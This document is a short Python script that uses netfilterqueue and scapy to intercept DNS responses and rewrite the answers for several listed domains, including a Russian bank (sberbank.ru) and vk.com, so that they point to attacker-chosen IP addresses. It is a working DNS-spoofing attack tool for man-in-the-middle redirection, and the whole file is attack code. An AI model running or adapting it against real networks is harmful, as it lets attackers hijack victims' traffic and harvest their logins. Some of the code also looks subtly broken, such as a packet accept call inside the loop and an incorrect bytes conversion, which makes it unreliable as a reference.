import netfilterqueue
import scapy.all

sites = {'library.mephi.ru': '212.8.235.7', 'sberbank.ru': '178.248.236.218', 'vk.com': '178.248.236.218', 'arngren.net' : '216.250.117.71'}


def spoof_packet(pack):
    #check is pack is DNS and change it
    getting_packet = scapy.all.IP(pack.get_payload())
    if getting_packet.haslayer(scapy.all.DNSRR):
        qname = getting_packet[scapy.all.DNSQR].qname
        for site in sites:
            if site.encode() in qname:
                dns_response = scapy.all.DNSRR(rrname=qname, rdata=sites[site].encode())
                getting_packet[scapy.all.DNS].an = dns_response
                getting_packet[scapy.all.DNS].ancount = 1
                
                try:
                    del getting_packet[scapy.all.IP].len
                    del getting_packet[scapy.all.IP].chksum
                    del getting_packet[scapy.all.UDP].len
                    del getting_packet[scapy.all.UDP].chksum
                except Exception as e:
                    print(e)
                    print(getting_packet.show())

                pack.set_payload(str(getting_packet).encode())
                print("CHANGING " + site)
            #break    
            pack.accept()


def main():
    # created queue previously and work with it
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, spoof_packet)
    queue.run()


if __name__ == "__main__":
    main()
